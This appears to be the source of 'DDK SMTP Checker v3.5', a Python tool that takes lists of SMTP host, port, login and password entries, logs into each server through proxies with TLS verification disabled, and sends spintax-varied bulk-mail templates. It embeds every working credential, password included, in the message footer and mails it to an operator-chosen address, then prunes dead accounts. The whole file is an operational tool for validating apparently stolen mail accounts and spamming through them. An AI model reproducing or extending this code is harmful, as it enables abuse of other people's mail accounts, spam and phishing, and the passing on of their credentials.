"""
SMTP Checker com Envio Real — DDK v3.5
Usa template real + sender names + assuntos + credenciais no rodapé
"""

import smtplib
import socket
import ssl
import time
import os
import threading
import random
import re
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.utils import formatdate, make_msgid
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

import socks
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.text import Text
from rich.align import Align
from rich.prompt import Prompt, Confirm
from rich import box
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn

from config import (
    SMTP_FILE,
    SMTP_TIMEOUT,
    PROXY_TYPE,
    USE_PROXY,
    REMOVED_SMTP_FILE,
    AUTO_CLEAN_INPUT_FILE,
    SAVE_REMOVED_SMTPS,
    HTML_TEMPLATE,
    SUBJECTS_FILE,
    FROM_NAMES_FILE,
    ENABLE_SPINTAX,
    ADD_LIST_UNSUBSCRIBE,
)
from utils import load_file_lines, logger, validate_email, random_string, extract_domain, sanitize_html
from email_builder import EmailBuilder

console = Console(
    force_terminal=True,
    color_system="standard",
    highlight=False,
    legacy_windows=True,
    soft_wrap=True,
    width=120,
)


class CheckResult:
    def __init__(self, account, status, detail="", latency=0, raw_line=""):
        self.account = account
        self.status = status
        self.detail = detail
        self.latency = latency
        self.raw_line = raw_line

    @property
    def is_alive(self):
        return self.status == "OK"


class CheckerSMTP(smtplib.SMTP):
    def __init__(self, host, port, timeout, proxy=None):
        self._proxy = proxy
        self._timeout = timeout
        super().__init__(host=host, port=port, timeout=timeout)

    def _get_socket(self, host, port, timeout):
        if self._proxy:
            proxy_types = {"socks4": socks.SOCKS4, "socks5": socks.SOCKS5, "http": socks.HTTP}
            sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
            sock.set_proxy(
                proxy_type=proxy_types.get(PROXY_TYPE, socks.SOCKS5),
                addr=self._proxy["host"],
                port=int(self._proxy["port"]),
                username=self._proxy.get("username"),
                password=self._proxy.get("password"),
            )
            sock.settimeout(self._timeout)
            sock.connect((host, port))
            return sock
        return socket.create_connection((host, port), timeout)


class CheckerSMTP_SSL(smtplib.SMTP_SSL):
    def __init__(self, host, port, timeout, context=None, proxy=None):
        self._proxy = proxy
        self._timeout = timeout
        if context is None:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
        super().__init__(host=host, port=port, timeout=timeout, context=context)

    def _get_socket(self, host, port, timeout):
        if self._proxy:
            proxy_types = {"socks4": socks.SOCKS4, "socks5": socks.SOCKS5, "http": socks.HTTP}
            sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
            sock.set_proxy(
                proxy_type=proxy_types.get(PROXY_TYPE, socks.SOCKS5),
                addr=self._proxy["host"],
                port=int(self._proxy["port"]),
                username=self._proxy.get("username"),
                password=self._proxy.get("password"),
            )
            sock.settimeout(self._timeout)
            sock.connect((host, port))
            return self.context.wrap_socket(sock, server_hostname=host, do_handshake_on_connect=True)
        return super()._get_socket(host, port, timeout)


class SMTPChecker:
    def __init__(self, proxy_manager=None, test_recipient=""):
        self.proxy_manager = proxy_manager
        self.test_recipient = test_recipient
        self.results = []
        self.lock = threading.Lock()
        self.file_lock = threading.Lock()
        
        self.email_builder = EmailBuilder()
        self._load_resources()

    def _load_resources(self):
        """Carrega template, assuntos e nomes"""
        if os.path.exists(HTML_TEMPLATE):
            self.email_builder.load_template(HTML_TEMPLATE)
        else:
            self.email_builder.html_template = "<html><body><p>Teste SMTP</p></body></html>"
        
        self.subjects = load_file_lines(SUBJECTS_FILE)
        if not self.subjects:
            self.subjects = ["Comunicado #{random}"]
        
        self.from_names = load_file_lines(FROM_NAMES_FILE)
        if not self.from_names:
            self.from_names = ["Atendimento"]
        
        self.email_builder.from_names = self.from_names

    def _get_random_subject(self):
        """Assunto aleatório com spintax"""
        subject = random.choice(self.subjects)
        if ENABLE_SPINTAX:
            subject = self.email_builder._parse_spintax(subject)
        subject = subject.replace("{random}", str(random.randint(10000, 99999)))
        return subject

    def _build_test_email(self, host, port, login, password, raw_line):
        """Constrói email usando o template real + credenciais no final"""
        try:
            # Assunto aleatório
            subject = self._get_random_subject()
            
            # Template HTML
            html_body = self.email_builder.html_template
            
            # Aplica variáveis
            template_vars = {
                "random": str(random.randint(10000, 99999)),
                "email": self.test_recipient,
                "to": self.test_recipient,
                "domain": extract_domain(login),
                "date": time.strftime("%d/%m/%Y"),
            }
            html_body = self.email_builder._apply_variables(html_body, template_vars)
            
            if ENABLE_SPINTAX:
                html_body = self.email_builder._parse_spintax(html_body)
            
            html_body = sanitize_html(html_body)
            
            # Adiciona credenciais no final do HTML
            credenciais_block = f"""
            <hr style="border:none;border-top:1px solid #ddd;margin:20px 0;">
            <p style="font-size:11px;color:#999;font-family:monospace;">
                SMTP: {host}|{port}|{login}|{password}
            </p>
            """
            html_body += credenciais_block
            
            # Gera texto plano
            text_body = self.email_builder._html_to_text(html_body)
            
            # Constrói MIME
            msg = MIMEMultipart("alternative")
            
            # From name
            from_name = random.choice(self.from_names)
            if ENABLE_SPINTAX:
                from_name = self.email_builder._parse_spintax(from_name)
            
            from_domain = extract_domain(login)
            msg["From"] = f"{from_name} <{login}>"
            msg["To"] = self.test_recipient
            msg["Subject"] = subject
            msg["Date"] = formatdate(localtime=True)
            msg["Message-ID"] = make_msgid(domain=from_domain if "." in from_domain else "local")
            msg["MIME-Version"] = "1.0"
            
            if ADD_LIST_UNSUBSCRIBE:
                unsub_id = random_string(12)
                msg["List-Unsubscribe"] = f"<mailto:unsubscribe-{unsub_id}@{from_domain}>"
                msg["List-Unsubscribe-Post"] = "List-Unsubscribe=One-Click"
            
            # Anexa partes
            part_text = MIMEText(text_body, "plain", "utf-8")
            part_html = MIMEText(html_body, "html", "utf-8")
            msg.attach(part_text)
            msg.attach(part_html)
            
            return msg.as_string()
            
        except Exception as e:
            logger.error(f"Erro ao construir email: {e}")
            # Fallback simples
            raw_credentials = f"{host}|{port}|{login}|{password}"
            msg = MIMEText(raw_credentials, "plain", "utf-8")
            msg["From"] = login
            msg["To"] = self.test_recipient
            msg["Subject"] = f"SMTP OK [{host}:{port}]"
            msg["Date"] = formatdate(localtime=True)
            msg["Message-ID"] = make_msgid(domain=host if "." in host else "local")
            return msg.as_string()

    def check_and_send(self, host, port, login, password, raw_line=""):
        """Testa conexão, autentica e envia com template real"""
        port = int(port)
        label = f"{login}@{host}:{port}"
        use_ssl = port == 465
        connection = None
        start_time = time.time()

        proxy = None
        if USE_PROXY and self.proxy_manager and self.proxy_manager.has_proxies():
            proxy = self.proxy_manager.get_proxy()

        try:
            # Conexão
            if use_ssl:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                connection = CheckerSMTP_SSL(host=host, port=port, timeout=SMTP_TIMEOUT, context=ctx, proxy=proxy)
                connection.ehlo()
            else:
                connection = CheckerSMTP(host=host, port=port, timeout=SMTP_TIMEOUT, proxy=proxy)
                connection.ehlo()
                if connection.has_extn("STARTTLS") or port in (587, 25, 2525):
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    connection.starttls(context=ctx)
                    connection.ehlo()

            # Autenticação
            connection.login(login, password)

            # Construir email com template real
            raw_message = self._build_test_email(host, port, login, password, raw_line)

            # Envio
            connection.sendmail(login, [self.test_recipient], raw_message)

            latency = (time.time() - start_time) * 1000
            return CheckResult(label, "OK", "Enviado com template real", latency, raw_line)

        except smtplib.SMTPAuthenticationError as e:
            latency = (time.time() - start_time) * 1000
            return CheckResult(label, "AUTH_FAIL", f"Auth: {e}", latency, raw_line)

        except smtplib.SMTPSenderRefused as e:
            latency = (time.time() - start_time) * 1000
            return CheckResult(label, "BLOCKED", f"Sender: {e}", latency, raw_line)

        except smtplib.SMTPRecipientsRefused as e:
            latency = (time.time() - start_time) * 1000
            return CheckResult(label, "SEND_FAIL", f"Recip: {e}", latency, raw_line)

        except smtplib.SMTPDataError as e:
            latency = (time.time() - start_time) * 1000
            return CheckResult(label, "SEND_FAIL", f"Data: {e}", latency, raw_line)

        except (socket.timeout, TimeoutError, OSError) as e:
            latency = (time.time() - start_time) * 1000
            return CheckResult(label, "TIMEOUT", str(e)[:60], latency, raw_line)

        except smtplib.SMTPConnectError as e:
            latency = (time.time() - start_time) * 1000
            return CheckResult(label, "BLOCKED", f"Conn: {e}", latency, raw_line)

        except Exception as e:
            latency = (time.time() - start_time) * 1000
            return CheckResult(label, "ERROR", f"{type(e).__name__}: {str(e)[:50]}", latency, raw_line)

        finally:
            if connection:
                try:
                    connection.quit()
                except:
                    try:
                        connection.close()
                    except:
                        pass

    def check_all(self, smtp_lines, num_threads=10):
        total = len(smtp_lines)
        self.results = []

        console.print()
        panel = Panel(
            Align.center(Text(
                f"🔍 Testando {total} SMTPs com template real para {self.test_recipient}",
                style="bold cyan"
            )),
            box=box.ROUNDED,
            border_style="cyan",
        )
        console.print(panel)
        console.print()

        ok_count = 0
        fail_count = 0

        with Progress(
            SpinnerColumn(style="cyan"),
            TextColumn("[bold blue]{task.description}"),
            BarColumn(bar_width=40, complete_style="green", finished_style="bold green"),
            TextColumn("[bold]{task.completed}/{task.total}"),
            TextColumn("[dim]({task.percentage:.0f}%)"),
            TimeElapsedColumn(),
            console=console,
        ) as progress:
            task_id = progress.add_task("Testando...", total=total)

            with ThreadPoolExecutor(max_workers=num_threads) as executor:
                futures = {}
                for line in smtp_lines:
                    parts = line.strip().split("|")
                    if len(parts) == 4:
                        future = executor.submit(
                            self.check_and_send,
                            parts[0].strip(),
                            parts[1].strip(),
                            parts[2].strip(),
                            parts[3].strip(),
                            line.strip(),
                        )
                        futures[future] = line.strip()

                for future in as_completed(futures):
                    try:
                        result = future.result()
                        with self.lock:
                            self.results.append(result)

                        if result.is_alive:
                            ok_count += 1
                            console.print(
                                f"  [bold green]✔ ENVIADO[/bold green] │ "
                                f"[white]{result.account:<40}[/white] │ "
                                f"[dim]{result.latency:.0f}ms[/dim]"
                            )
                        else:
                            fail_count += 1
                            console.print(
                                f"  [bold red]✖ {result.status:<9}[/bold red] │ "
                                f"[white]{result.account:<40}[/white] │ "
                                f"[red]{result.detail}[/red]"
                            )
                    except Exception as e:
                        fail_count += 1

                    progress.advance(task_id)

        return ok_count, fail_count

    def show_report(self, ok_count, fail_count, elapsed):
        total = ok_count + fail_count
        rate = (ok_count / total * 100) if total > 0 else 0

        console.print()
        grid = Table(box=box.DOUBLE_EDGE, border_style="bright_cyan", title="📊 RELATÓRIO")
        grid.add_column("Métrica", style="bold white")
        grid.add_column("Valor", justify="right", style="bold cyan")
        grid.add_row("Total Testados", str(total))
        grid.add_row("Enviados", f"[green]{ok_count}[/green]")
        grid.add_row("Falhas", f"[red]{fail_count}[/red]")
        grid.add_row("Taxa", f"{rate:.1f}%")
        grid.add_row("Tempo", f"{elapsed:.1f}s")
        console.print(grid)

    def clean_dead_smtps(self):
        dead = [r for r in self.results if not r.is_alive]
        if not dead:
            console.print("\n  [green]✔ Todos OK![/green]")
            return

        dead_raw_lines = set(r.raw_line for r in dead if r.raw_line)

        if SAVE_REMOVED_SMTPS:
            try:
                os.makedirs(os.path.dirname(REMOVED_SMTP_FILE), exist_ok=True)
                with open(REMOVED_SMTP_FILE, "a", encoding="utf-8") as f:
                    f.write(f"\n# Checker: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}\n")
                    for r in dead:
                        f.write(f"{r.raw_line} # {r.status} - {r.detail}\n")
            except Exception as e:
                logger.error(f"Erro ao salvar: {e}")

        if AUTO_CLEAN_INPUT_FILE and os.path.exists(SMTP_FILE):
            try:
                with open(SMTP_FILE, "r", encoding="utf-8") as f:
                    all_lines = f.readlines()
                cleaned = [l for l in all_lines if l.strip() not in dead_raw_lines]
                with open(SMTP_FILE, "w", encoding="utf-8") as f:
                    f.writelines(cleaned)
                console.print(f"\n  [yellow]🗑️ {len(dead_raw_lines)} SMTPs removidos[/yellow]")
            except Exception as e:
                console.print(f"\n  [red]Erro: {e}[/red]")


def run_checker(proxy_manager=None, num_threads=10):
    console.clear()
    console.print(Panel(
        Align.center(Text("🔍 DDK SMTP CHECKER v3.5", style="bold cyan")),
        box=box.DOUBLE_EDGE,
        border_style="bright_blue",
        padding=(1, 2),
    ))

    smtp_lines = load_file_lines(SMTP_FILE)
    if not smtp_lines:
        console.print(f"\n  [red]❌ Nenhum SMTP em {SMTP_FILE}[/red]")
        return

    console.print(f"\n  [blue]ℹ[/blue] {len(smtp_lines)} SMTPs carregados")

    while True:
        test_email = Prompt.ask("\n📧 [white]Email para receber os testes[/white]")
        if validate_email(test_email):
            break
        console.print("  [red]Email inválido![/red]")

    checker = SMTPChecker(proxy_manager=proxy_manager, test_recipient=test_email)
    start_time = time.time()

    ok_count, fail_count = checker.check_all(smtp_lines, num_threads=num_threads)
    elapsed = time.time() - start_time

    checker.show_report(ok_count, fail_count, elapsed)

    if fail_count > 0:
        console.print()
        if Confirm.ask("🗑️ [yellow]Remover SMTPs mortos?[/yellow]", default=True):
            checker.clean_dead_smtps()

    console.print()